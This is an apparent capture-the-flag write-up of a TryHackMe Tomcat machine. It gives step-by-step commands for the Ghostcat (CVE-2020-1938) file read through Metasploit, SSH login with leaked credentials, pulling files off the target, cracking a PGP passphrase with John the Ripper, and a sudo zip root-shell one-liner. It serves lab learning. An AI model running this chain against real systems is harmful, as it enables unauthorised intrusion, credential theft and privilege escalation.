1. Reconnaissance

First, I performed an Nmap scan to identify open ports:

nmap -sC -sV <IP>

Open ports:
22/tcp   open  ssh
53/tcp   open  domain
8009/tcp open  ajp13
8080/tcp open  http


Visiting the web service:

http://<IP>:8080


The page revealed an Apache Tomcat server.

2. Exploitation — Ghostcat (CVE-2020-1938)

Since port 8009 (AJP) was open, I searched for known Tomcat vulnerabilities in Metasploit.

msfconsole
search tomcat


Relevant module found:

auxiliary/admin/http/tomcat_ghostcat

Module configuration:
use auxiliary/admin/http/tomcat_ghostcat
set RHOSTS <IP>
set RPORT 8009

Run exploit:
run


The module leaked sensitive data from web.xml:

skyfuck:8730281lkjlkjdqlksalks


Credentials obtained:

Username: skyfuck

Password: 8730281lkjlkjdqlksalks

3. Initial Access (SSH)

Using the discovered credentials:

ssh skyfuck@<IP>


Successful login.

4. File Enumeration & Exfiltration

In the home directory, I found two interesting files:

credential.pgp
tryhackme.asc


To transfer them to my local machine, I started a Python HTTP server on the target:

python3 -m http.server 1234

Download files from Kali:
wget http://<IP>:1234/tryhackme.asc
wget http://<IP>:1234/credential.pgp

5. Cracking the PGP Private Key

The file tryhackme.asc contained a PGP private key, protected by a password.

Extract hash:
gpg2john tryhackme.asc > hash

Crack with John the Ripper:
john hash --wordlist=/usr/share/wordlists/rockyou.txt


Password found:

alexandru

6. Decrypting Credentials
Import private key:
gpg --import tryhackme.asc

Decrypt encrypted file:
gpg --decrypt credential.pgp


Output revealed new credentials:

merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j

7. Lateral Movement (User Merlin)

Switch user:

su merlin


User flag found:

cat ~/user.txt

THM{flag}

8. Privilege Escalation

Check sudo permissions:

sudo -l


Result:
(ALL) NOPASSWD: /usr/bin/zip

Exploit ZIP (GTFOBins)
TF=$(mktemp -u)
sudo /usr/bin/zip $TF /etc/hosts -T -TT 'sh #'

Root shell obtained.

9. Root Flag
cd /root
cat root.txt

THM{flag}

10. Conclusion / Lessons Learned

* Enumerating AJP (8009) is critical on Tomcat servers
* Ghostcat allows sensitive file disclosure
* PGP keys can often be cracked with weak passwords
* Always check sudo permissions for privilege escalation
